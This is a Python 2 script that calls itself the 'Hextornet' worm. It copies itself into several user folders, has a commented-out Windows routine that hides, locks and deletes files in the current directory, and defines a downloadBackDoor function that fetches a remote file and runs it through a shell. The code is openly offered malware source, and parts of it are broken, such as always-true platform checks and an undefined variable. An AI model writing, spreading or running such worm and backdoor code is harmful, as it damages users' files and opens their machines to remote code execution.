#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil
import locale
from random import randint


print(
"""
[==========================]
+                          +
+     WORM HEXTORNET       +
+                          +
[==========================]
"""
)

#Use in windows
"""
	if(os.path.isdir("E:\\")):
		dst = "E:" + "\\hextornet.py"
	elif(os.path.isdir("C:\\")):
		dst = "C:\\Users\\" + usr + "\\hextornet.py"
	
	else:
		dst = os.getcwd() + "hextornet.py"
"""

src = os.path.abspath("hextornet.py")
usr = getpass.getuser()
lang = locale.getdefaultlocale()
directories = ""


directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
dst = ""

def windows_client(system = sys.platform):
    if system.startswith('win'):
        return True
    else:
	return False

def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False

if(windows_client):
	dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + "hextornet.py"
	copyfile(src, dst)
	print'dst',dst
elif(linux_client):
	dst = 'root' + usr + '/' + directory + '/' + 'hextornet.py'
	copyfile(src, dst)
	print'dst',dst
	


def propagate():
	global lang_es
	global lang_en
	global directories
	print("==========Worm location==========")
	while len(directories) != 0:
		for directory in directories:
			if(windows_client):
				dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + "hextornet.py"
				copyfile(src, dst)
				print'dst',dst
			elif(linux_client):
				dst = 'root' + usr + '/' + directory + '/' + 'hextornet.py'
				copyfile(src, dst)
				print'dst',dst
			else:
				dst = os.getcwd() + "hextornet.py"
			directories.remove(directory)
	print("=================================")

#Use in windows
"""
def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
			os.remove(fname)
"""


def downloadBackDoor(url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        run(os.path.abspath(filename))
	print "==========finish downloading=========="

def run(program):
	process = sp.Popen('python '+program, shell=True)
	process.wait()

def main():
	propagate()
	#hide()
	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")


if __name__ == "__main__":
	main()
